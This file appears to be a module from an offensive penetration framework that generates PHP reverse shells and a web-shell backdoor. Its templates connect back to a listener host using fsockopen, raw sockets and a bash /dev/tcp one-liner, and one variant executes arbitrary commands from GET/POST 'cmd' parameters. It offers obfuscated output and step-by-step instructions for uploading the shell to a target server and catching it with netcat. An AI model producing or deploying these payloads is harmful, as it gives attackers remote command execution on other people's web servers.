# /root/lazy1/modules/payloads/reverse/web/php_tcp.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "PHP Reverse TCP (Web Shell)",
    "description": "Advanced PHP reverse shell for web applications with multiple execution methods",
    "author": "LazyFramework Team",
    "license": "MIT",
    "platform": "Web",
    "arch": "PHP",
    "rank": "Great",
    "dependencies": []
}

OPTIONS = {
    "lhost": {
        "description": "Listener IP address",
        "required": True,
        "default": "192.168.1.100"
    },
    "lport": {
        "description": "Listener port",
        "required": True,
        "default": "4444"
    },
    "method": {
        "description": "PHP execution method",
        "required": False,
        "default": "fsockopen",
        "choices": ["fsockopen", "socket", "curl", "wget", "exec", "system", "backdoor"]
    },
    "output": {
        "description": "Output format",
        "required": False,
        "default": "file",
        "choices": ["file", "oneliner", "minified", "obfuscated"]
    },
    "shell": {
        "description": "Shell type",
        "required": False,
        "default": "system",
        "choices": ["system", "exec", "shell_exec", "passthru"]
    }
}

def generate_php_reverse(lhost, lport, method="fsockopen", output="file", shell="system"):
    """Generate advanced PHP reverse shell"""
    
    # Base payloads for different methods
    payloads = {
        "fsockopen": f'''<?php
$s=fsockopen("{lhost}",{lport});
while(!feof($s)){{
    fwrite($s,"$ ");
    $c=fgets($s,1024);
    ${shell}($c);
}}
fclose($s);
?>''',
        
        "socket": f'''<?php
$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
socket_connect($s,"{lhost}",{lport});
while(true){{
    socket_write($s,"$ ");
    $c=socket_read($s,1024);
    ${shell}($c);
}}
?>''',
        
        "exec": f'''<?php
${shell}("bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'");
?>''',
        
        "backdoor": f'''<?php
if(isset($_GET['cmd'])){{
    ${shell}($_GET['cmd']);
}}
if(isset($_POST['cmd'])){{
    ${shell}($_POST['cmd']);
}}
?>'''
    }
    
    payload = payloads.get(method, payloads["fsockopen"])
    
    # Apply output formatting
    if output == "oneliner":
        payload = payload.replace('\n', '').replace('  ', ' ')
    elif output == "minified":
        payload = payload.replace('\n', '').replace('  ', '').replace(' {', '{').replace('} ', '}')
    elif output == "obfuscated":
        # Simple string obfuscation
        payload = payload.replace('fsockopen', '$f=\'fsockopen\';$f').replace('fwrite', '$fw=\'fwrite\';$fw')
    
    return payload

def run(session, options):
    lhost = options.get("lhost", "192.168.1.100")
    lport = options.get("lport", "4444")
    method = options.get("method", "fsockopen")
    output = options.get("output", "file")
    shell = options.get("shell", "system")
    
    console.print("\n[bold green]🐘 PHP Reverse TCP (Web Shell)[/bold green]")
    console.print("=" * 50)
    
    payload = generate_php_reverse(lhost, lport, method, output, shell)
    
    # Display information
    info_table = Table(show_header=True, header_style="bold cyan", box=box.ROUNDED)
    info_table.add_column("Parameter", style="green")
    info_table.add_column("Value", style="yellow")
    
    info_table.add_row("Listener", f"{lhost}:{lport}")
    info_table.add_row("Platform", "Web (PHP)")
    info_table.add_row("Method", method)
    info_table.add_row("Output", output)
    info_table.add_row("Shell Function", shell)
    info_table.add_row("PHP Version", "5.x/7.x/8.x")
    
    console.print(info_table)
    
    console.print(f"\n[bold yellow]📦 Generated Payload:[/bold yellow]")
    console.print(Panel(payload, border_style="green"))
    
    console.print(f"\n[bold green]🚀 Usage Instructions:[/bold green]")
    if output == "file":
        console.print("1. Save as .php file (e.g., shell.php)")
        console.print("2. Upload to web server")
        console.print("3. Access via browser: http://target/shell.php")
        console.print("4. Start listener before accessing")
    
    console.print(f"\n[bold blue]🎯 Listener:[/bold blue] nc -lnvp {lport}")
    
    console.print(f"\n[bold magenta]🔧 Alternative Access Methods:[/bold magenta]")
    console.print("  • Curl: curl http://target/shell.php")
    console.print("  • Wget: wget -q -O- http://target/shell.php")
    console.print("  • Browser: Navigate to URL")
    
    return payload
